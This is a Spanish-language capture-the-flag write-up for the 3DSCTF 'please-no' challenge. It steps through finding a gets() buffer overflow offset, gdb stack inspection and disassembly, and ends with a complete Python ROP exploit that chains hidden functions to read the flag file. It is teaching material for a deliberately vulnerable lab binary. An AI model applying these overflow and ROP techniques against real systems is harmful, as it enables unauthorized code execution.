[EN]
This time the programmer did a better job to hid his flag. But the problem still: It’s vulnerable. Can you obtain the flag?
Send to 209.190.1.131 9003
NOW WITH SECRET BONUS!

[PT-BR]
Dessa vez o programador caprichou um pouco mais na hora de esconder sua flag. O problema que continua vulneravel. Consegue extrair a flag?
Envie para 209.190.1.131 9003
AGORA COM BONUS SECRETO!


Aquí hay soluciones que me han ayudado a entender como había que resolver este reto:
https://ctftime.org/task/3258

##Solución

Es un archivo elf de 32 bits que "peta" al leer una cadena, el clásico buffer overflow. Para ver el offset, primero creamos un patrón con metasploit:
```
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
```
Luego lo ejecutamos en gdb:
```
gdb -q ./please-no
Voltron loaded.
Reading symbols from ./please-no...(no debugging symbols found)...done.
>>> dashboard -output /dev/pts/1
>>> r
Starting program: /root/Documents/3DSCTF/please-no 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
Program received signal SIGSEGV, Segmentation fault.
Traceback (most recent call last):
File "<string>", line 764, in lines
File "<string>", line 127, in run
gdb.error: No function contains program counter for selected frame.
During handling of the above exception, another exception occurred:
Traceback (most recent call last):
File "<string>", line 249, in on_stop
File "<string>", line 300, in build
File "<string>", line 782, in lines
gdb.MemoryError: Cannot access memory at address 0x37614136
0x37614136 in ?? ()
>>> quit
```
Y por último calculamos el offset:
```
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 200 -q 0x37614136
[*] Exact match at offset 20
```
Echemos un vistazo a las protecciones que tiene el binario:
```
gdb -q ./please-no
Reading symbols from ./please-no...(no debugging symbols found)...done.
gdb-peda$ checksec 
CANARY	: disabled
FORTIFY	: disabled
NX	: ENABLED
PIE	: disabled
RELRO	: Partial
```
Como no podemos usar la pila para ejecutar un shellcode (NX enabled), echemos un vistazo al código:
```
objdump -D intel -S please-no
```
No tenemos una clásica función main, parece que nuestras funciones están escondidas en la sección .text. Si lo analizamos con radare2 sí nos detecta la función main:
```
main ();
; var int local_8h @ esp+0x8
; DATA XREF from 0x08048497 (entry0)
0x08048710	; sub esp, 0x1c
0x08048713	; lea eax, dword [esp + local_8h]
0x08048717	; mov dword [esp], eax
0x0804871a	; call sym.imp.gets
0x0804871f	; xor eax, eax
0x08048721	; add esp, 0x1c
0x08048724	ret<br>
```
Se puede ver claramente una llamada a la función gets (call sym.imp.gets).
```
080483f0 <gets@plt>:
80483f0:	ff 25 10 a0 04 08	jmp	DWORD PTR ds:0x804a010
80483f6:	68 08 00 00 00		push	0x8
80483fb:	e9 d0 ff ff ff		jmp	80483d
```
También hay otras funciones interesantes:
```
08048410 <strcat@plt>:
8048410:	ff 25 18 a0 04 08	jmp	DWORD PTR ds:0x804a018
8048416:	68 18 00 00 00		push	0x18
804841b:	e9 b0 ff ff ff		jmp	80483d0 <printf@plt-0x10>

08048440 <fopen@plt>:
8048440:	ff 25 24 a0 04 08	jmp	DWORD PTR ds:0x804a024
8048446:	68 30 00 00 00		push	0x30
804844b:	e9 80 ff ff ff		jmp	80483d0 <printf@plt-0x10>
```
Vemos que hay una línea en .text que llama a gets, este puede ser un buen sitio para poner un breakpoint.
```
804871a:	e8 d1 fc ff ff		call	80483f0 <gets@plt>
804871f:	31 c0			xor	eax,eax
8048721:	83 c4 1c		add	esp,0x1c
8048724:	c3			ret
```
```
>>> br *0x804871f
Breakpoint 1 at 0x804871f
```
```
python -c "print 'A'*20"
AAAAAAAAAAAAAAAAAAAA
```
Ejecutamos el programa y vemos el estado de la pila después de meter 20 "A":
```
>>> r
Starting program: /root/Documents/3DSCTF/please-no 
AAAAAAAAAAAAAAAAAAAA
Breakpoint 1, 0x0804871f in ?? ()
>>> x/32xw $esp
0xbffff350	0xbffff358	0x0804824c	0x41414141	0x41414141
0xbffff360	0x41414141	0x41414141	0x41414141	0xb7e13200 <--
0xbffff370	0x00000001	0xbffff404	0xbffff40c	0x00000000
```
La flecha, que corresponde con la posición de la pila 0xbffff36c, indica el valor que tendremos que sobrescribir para controlar el EIP.
Recordar que aún nos quedan por ejecutar estas dos instrucciones de gets antes de ejecutar el return:
```
804871f:	31 c0			xor	eax,eax
8048721:	83 c4 1c		add	esp,0x1c
8048724:	c3			ret
```
Ya sabemos como controlar el EIP, pero ¿hacia donde lo apuntamos?
En el código de la sección .text aparece algo interesante:
```
8048690:	83 ec 1c             	sub    esp,0x1c
8048693:	81 7c 24 20 41 0c 0b 	cmp    DWORD PTR [esp+0x20],0x1b0b0c41   <--- Comparación sospechosa
804869a:	1b 
804869b:	75 2d                	jne    80486ca <fgetc@plt+0x26a>         <--- Me echa si no coincide con 0x1b0b0c41
804869d:	81 7c 24 24 4e 37 13 	cmp    DWORD PTR [esp+0x24],0xae13374e   <--- Otra comparación sospechosa ¿dónde quiere ir?
80486a4:	ae 
80486a5:	75 23                	jne    80486ca <fgetc@plt+0x26a>         <--- Me echa al mismo sitio si no coincide con 0xae13374e
80486a7:	c7 44 24 16 6d 66 6c 	mov    DWORD PTR [esp+0x16],0x616c666d	 <--- ¿Mete en la pila el nombre del fichero? 0x616c666d='alfm'
80486ae:	61 
80486af:	66 c7 44 24 1a 67 00 	mov    WORD PTR [esp+0x1a],0x67          <--- ¿Y luego una 'g'? ¿'mflag' nombre del fichero? ¿Extensión?
80486b6:	8d 44 24 16          	lea    eax,[esp+0x16]                    <--- Carga la posición de memoria donde está 'mflag'
80486ba:	89 44 24 04          	mov    DWORD PTR [esp+0x4],eax           <--- Nombre del fichero como arg2 de strcat
80486be:	c7 04 24 39 a0 04 08 	mov    DWORD PTR [esp],0x804a039         <--- Puntero como arg1 donde guardar resultado
80486c5:	e8 46 fd ff ff       	call   8048410 <strcat@plt>              <--- Copia el nombre de fichero en memoria
80486ca:	83 c4 1c             	add    esp,0x1c
80486cd:	c3                   	ret    
```
Vamos a apuntar el EIP a 0x8048690 y además añadimos los dos valores para superar la doble comparación (0x1b0b0c41 y 0xae13374e). 
Podemos tener la tentación de saltar directamente a 0x80486a7 pero entonces no se ejecutaría el 'sub esp,0x1c' que es básico para preparar la llamada a strcat. 
```
set {int}0xbffff36c = 0x08048690
```
Una vez ejecutada la instrucción 0x8048690 la pila quedaría así:
```
>>> x/32xw $esp
0xbffff354:	0x0804824c	0x41414141	0x41414141	0x41414141
0xbffff364:	0x41414141	0x41414141	0x08048690	0x00000001
0xbffff374:	0xbffff404	0xbffff40c	0x00000000	0x00000000
```
Para asegurarnos de que cumpla las dos comparaciones habrá que poner esos valores en su lugar correspondiente en la pila([esp+0x20]=0xbffff374 y [esp+0x24]=0xbffff378):
```
set {int}0xbffff374 = 0x1b0b0c41
set {int}0xbffff378 = 0xae13374e
```
Ya tenemos pila con los valores deseados para que llegue hasta la función strcat:
```
>>> x/32xw $esp
0xbffff354:	0x0804824c	0x41414141	0x41414141	0x41414141
0xbffff364:	0x41414141	0x41414141	0x08048690	0x00000001
0xbffff374:	0x1b0b0c41	0xae13374e	0x00000000	0x00000000
```
Estado de la pila antes de llamar a strcat:
```
>>> x/32xw $esp
0xbffff354:	0x0804a039	0xbffff36a	0x41414141	0x41414141
0xbffff364:	0x41414141	0x666d4141	0x0067616c	0x00000001
0xbffff374:	0x1b0b0c41	0xae13374e	0x00000000	0x00000000
```
En strcat copia a la posición 0x0804a039 el nombre del fichero 'mflag'
```
x/32xw 0x0804a039
0x804a039:	0x616c666d	0x00000067	0x00000000	0x00000000

x/32xw $esp
0xbffff354:	0x0804a039	0xbffff36a	0x41414141	0x41414141
0xbffff364:	0x41414141	0x666d4141	0x0067616c	0x00000001
0xbffff374:	0x1b0b0c41	0xae13374e	0x00000000	0x00000000
```
Después de restar 0x1c a $esp:
```
0xbffff370:	0x00000001	0x1b0b0c41	0xae13374e	0x00000000
0xbffff380:	0x00000000	0x00000000	0xb7fae000	0xb7fffc04
```
Ahora tenemos que ingeniarnoslas para apuntar a otro sitio el EIP y seguir con la ejecucción del programa, pero... ¿hacia donde?
Cuando modificamos las variables de la pila para llegar a strcat, fue a partir de la posición 0xbffff36c
```
0xbffff36c:	0x08048690	0x00000001	0x1b0b0c41	0xae13374e
```
La posición 0xbffff370 no la tocamos en su momento, pero ahora es necesario modificarla pues es nuestra posición de retorno. 
Aquí tenemos que ir a una posición de memoria que salte las dos posiciones de memoria de las dos condiciones para ir al strcat y poder seguir ejecutando el programa. 
Para eso hacemos ROP, apuntando a un sitio en memoria donde haya un 'gadget' o código parecido a esto:
```
add  esp,0x8
pop    esi
ret    
```
Se pueden buscar 'gadgets' con gdb-peda, con ropeme o rp-lin-x86. Encontramos el 'gadget' en 0x8048601:
```
set {int}0xbffff370 = 0x8048601
```
```
0xbffff370:	0x08048601	0x1b0b0c41	0xae13374e	0x00000000
0xbffff380:	0x00000000	0x00000000	0xb7fae000	0xb7fffc04
```
Una vez ejecutado nuestro gadget, tenemos el ret en la posición 0xbffff380. ¿Dónde vamos ahora para que nos muestre el flag?
A la hora de preparar nuestro ataque la posición 0xbffff37c no es importante por lo que vamos a poner cualquier valor: 0xdeadbeef
Como ya hemos visto antes, sabemos el nombre del archivo 'mflag', pero desconocemos la extensión del mismo. 
Buscando en .text encontramos la extensión:
```
8048650:	83 ec 1c             	sub    esp,0x1c
8048653:	81 7c 24 20 37 13 b0 	cmp    DWORD PTR [esp+0x20],0xb0b01337  <--- Comparación sospechosa
804865a:	b0 
804865b:	75 23                	jne    8048680 <fgetc@plt+0x220>
804865d:	c7 44 24 16 2e 74 65 	mov    DWORD PTR [esp+0x16],0x7865742e  <--- ¿Extensión? 7865742e=xet.
8048664:	78 
8048665:	66 c7 44 24 1a 74 00 	mov    WORD PTR [esp+0x1a],0x74         <--- ¿Otro caracter de la extensión? 0x74=t
804866c:	8d 44 24 16          	lea    eax,[esp+0x16]                   <--- Carga addr de la extensión (.text)
8048670:	89 44 24 04          	mov    DWORD PTR [esp+0x4],eax
8048674:	c7 04 24 39 a0 04 08 	mov    DWORD PTR [esp],0x804a039
804867b:	e8 90 fd ff ff       	call   8048410 <strcat@plt>             <--- Copia la extensión en memoria
8048680:	83 c4 1c             	add    esp,0x1c
8048683:	c3                   	ret    
```
¿Y esto no se podía haber visto con 'strings'? No salen los nombres completos, sale algo parecido:
```
strings please-no | grep fla
mflaf
strings please-no | grep .tex
.texf
```
Parece claro que tenemos que enviar la ejecucción a 0x8048650 y además meter el valor de la comparación (0xb0b01337):
```
set {int}0xbffff380 = 0x8048650
set {int}0xbffff388 = 0xb0b01337
```
La posición 0xbffff384 la usaremos más tarde cuando vuelva de llamar a strcat y saltarnos el 'gap' de la comparación.
Después de llamar a strcat tenemos el nombre y extensión del archivo en 0x804a039
```
>>> x/32xw 0x804a039
0x804a039:	0x616c666d	0x65742e67	0x00007478	0x00000000
```
Ahora hay que volver a buscar otro 'gadget' para saltarnos la comparación del valor y dirigir EIP en 0xbffff38c.
Para eso necesitamos algo como lo que hay en la posición 0x80483c9 (pop ebx; ret)   
```
set {int}0xbffff384 = 0x80483c9
```
¿Qué nos queda ahora? Lo siguiente será leer el fichero y que nos muestre el flag y salir del programa.
Mirando en .text encontramos lo que queremos:
```
 8048590:	56                   	push   esi
 8048591:	83 ec 08             	sub    esp,0x8
 8048594:	c7 44 24 04 d0 87 04 	mov    DWORD PTR [esp+0x4],0x80487d0
 804859b:	08 
 804859c:	c7 04 24 39 a0 04 08 	mov    DWORD PTR [esp],0x804a039   <--- Posición de memoria donde está el nombre del fichero
 80485a3:	e8 98 fe ff ff       	call   8048440 <fopen@plt>         <--- Abre el fichero
 80485a8:	89 c6                	mov    esi,eax
 80485aa:	85 f6                	test   esi,esi
 80485ac:	74 53                	je     8048601 <fgetc@plt+0x1a1>
 80485ae:	89 34 24             	mov    DWORD PTR [esp],esi
 80485b1:	e8 aa fe ff ff       	call   8048460 <fgetc@plt>         <--- Lee el fichero
 80485b6:	0f b6 c8             	movzx  ecx,al
 80485b9:	81 f9 ff 00 00 00    	cmp    ecx,0xff
 80485bf:	74 2c                	je     80485ed <fgetc@plt+0x18d>
 80485c1:	0f be c8             	movsx  ecx,al
 80485c4:	66 66 66 2e 0f 1f 84 	data16 data16 nop WORD PTR cs:[eax+eax*1+0x0]
 80485cb:	00 00 00 00 00 
 80485d0:	89 0c 24             	mov    DWORD PTR [esp],ecx
 80485d3:	e8 78 fe ff ff       	call   8048450 <putchar@plt>
 80485d8:	89 34 24             	mov    DWORD PTR [esp],esi
 80485db:	e8 80 fe ff ff       	call   8048460 <fgetc@plt>
 80485e0:	0f be c8             	movsx  ecx,al
 80485e3:	0f b6 c0             	movzx  eax,al
 80485e6:	3d ff 00 00 00       	cmp    eax,0xff
 80485eb:	75 e3                	jne    80485d0 <fgetc@plt+0x170>
 80485ed:	c7 04 24 0a 00 00 00 	mov    DWORD PTR [esp],0xa
 80485f4:	e8 57 fe ff ff       	call   8048450 <putchar@plt>       <--- Muestra por pantalla el contenido
 80485f9:	89 34 24             	mov    DWORD PTR [esp],esi
 80485fc:	e8 ff fd ff ff       	call   8048400 <fclose@plt>        <--- Cierra el fichero
 8048601:	83 c4 08             	add    esp,0x8
 8048604:	5e                   	pop    esi
 8048605:	c3                   	ret 
```
Apuntamos el EIP hacia 0x8048590:
```
set {int}0xbffff38c = 0x8048590
```
Ahora solo nos queda apuntar a exit:
```
08048420 <exit@plt>:
8048420:	ff 25 1c a0 04 08    	jmp    DWORD PTR ds:0x804a01c
8048426:	68 20 00 00 00       	push   0x20
804842b:	e9 a0 ff ff ff       	jmp    80483d0 <printf@plt-0x10>
```
```
set {int}0xbffff390 = 0x8048420
```

Python final para explotar:
```
#!/usr/bin/python
# Fichero pwn_please_no.py 
# Exploit ROP

 
from struct import pack
 
binary = "please-no"
junk = "A" * 20

rop = pack('<I', 0x8048690)   
rop += pack('<I', 0x8048601)    
rop += pack('<I', 0x1B0B0C41)   
rop += pack('<I', 0xAE13374E)   
rop += pack('<I', 0xdeadbeef)   
rop += pack('<I', 0x8048650)   
rop += pack('<I', 0x80483c9)  
rop += pack('<I', 0xB0B01337)   
rop += pack('<I', 0x8048590)
rop += pack('<I', 0x08048420)

payload = junk + rop 
print payload

# Fin fichero pwn_please_no.py
```

Breakpoints para seguir la ejecucción
```
>>> i br
Num     Type           Disp Enb Address    What
2       breakpoint     keep y   0x0804871f 
	breakpoint already hit 1 time
3       breakpoint     keep y   0x080486ca 
	breakpoint already hit 1 time
4       breakpoint     keep y   0x08048680 
	breakpoint already hit 1 time
6       breakpoint     keep y   0x08048605 
	breakpoint already hit 1 time
```
